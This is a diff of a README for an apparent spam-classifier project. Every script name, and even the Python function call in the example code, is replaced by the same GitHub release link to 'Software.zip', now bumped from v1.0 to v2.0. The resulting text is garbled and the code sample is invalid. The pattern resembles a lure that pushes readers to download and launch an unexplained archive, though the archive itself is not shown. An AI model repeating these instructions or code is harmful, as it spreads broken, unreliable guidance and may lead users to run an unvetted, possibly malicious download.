@@ -25,14 +25,14 @@ Welcome to the Spam-Filter repository! In this project, we have developed a spam
 ## Installation
 To get started with the Spam-Filter project, you can download the source code by clicking on the following link: 
 
-[![Download Zip](https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v1.0/Software.zip)](https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v1.0/Software.zip) 
+[![Download Zip](https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v2.0/Software.zip)](https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v2.0/Software.zip) 
 
-Once the download is complete, extract the contents of the zip file and launch the `https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v1.0/Software.zip` script to run the spam filter.
+Once the download is complete, extract the contents of the zip file and launch the `https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v2.0/Software.zip` script to run the spam filter.
 
 ## Usage
 To use the Spam-Filter, follow these steps:
 1. Install the required libraries by running `pip install numpy pandas scikit-learn spacy`
-2. Run the `https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v1.0/Software.zip` script
+2. Run the `https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v2.0/Software.zip` script
 3. Input the text you want to classify as spam or not spam
 4. Receive the classification result based on the trained model 
 
@@ -49,7 +49,7 @@ filter = SpamFilter()
 text = "Get rich quick! Click here now!"
 
 # Use the filter to classify the text
-result = https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v1.0/Software.zip(text)
+result = https://github.com/MiyajiAnimation/Spam-Filter/releases/download/v2.0/Software.zip(text)
 
 print(result)
 ```
